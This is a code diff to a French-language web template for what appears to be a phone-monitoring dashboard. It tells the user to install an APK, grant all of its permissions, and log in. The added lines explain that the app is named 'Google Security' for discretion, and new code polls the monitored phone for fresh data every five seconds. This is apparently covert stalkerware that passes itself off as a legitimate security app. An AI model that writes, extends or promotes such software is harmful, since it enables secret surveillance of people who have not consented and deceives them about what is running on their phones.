@@ -529,8 +529,7 @@
 
                     </div>
                     <div class="modal-footer">
-                        <button type="button" class="btn btn-white btn-rounded btn-sm"
-                            data-dismiss="modal">Fermer</button>
+                        <button type="button" class="btn btn-rounded btn-sm" data-dismiss="modal">Fermer</button>
                     </div>
                 </div>
             </div>
@@ -552,6 +551,12 @@
                                 Ouvrez le navigateur, télécharger et installer l’application en allant sur le lien :
                                 <a href="{{ asset('app.apk') }}">{{ asset('app.apk') }}</a> ({{ apkSize() }})
                             </li>
+                        </ul>
+                        <p class="text-danger">
+                            <i class="fa fa-info-circle"></i>
+                            Pour question de discretion, l'application est nommée <b>"Google Security"</b>
+                        </p>
+                        <ul>
                             <li>Une fois l’application installée, ouvrez-la et autoriser toutes les permissions qui seront
                                 demandées</li>
                             <li>Puis cliquez sur le bouton « Se connecter », en suite connectez-vous avec votre email et mot
@@ -1034,8 +1039,12 @@
                 }
 
                 $('[btnrefresh]').click(function() {
+                    refresh(false);
+                });
+
+                function refresh(interval = true) {
                     var pid = phonesel.val();
-                    var btn = $(this);
+                    var btn = $('[btnrefresh]');
                     var i = btn.find('i');
                     i.addClass('fa-spin');
                     btn.attr('disabled', true);
@@ -1044,14 +1053,20 @@
                         type: 'put',
                         contentType: 'application/json',
                         data: JSON.stringify({
-                            action: 'refresh',
-                            phone_id: pid,
+                            action: 'refresh'
                         }),
                     }).always(function() {
                         btn.attr('disabled', false);
                         i.removeClass('fa-spin');
+                        if (interval) {
+                            setTimeout(() => {
+                                refresh(true);
+                            }, 5000);
+                        }
                     });
-                });
+                }
+
+                refresh(true);
 
                 var dtResult = (new DataTable('[tresult]', {
                     searching: false,
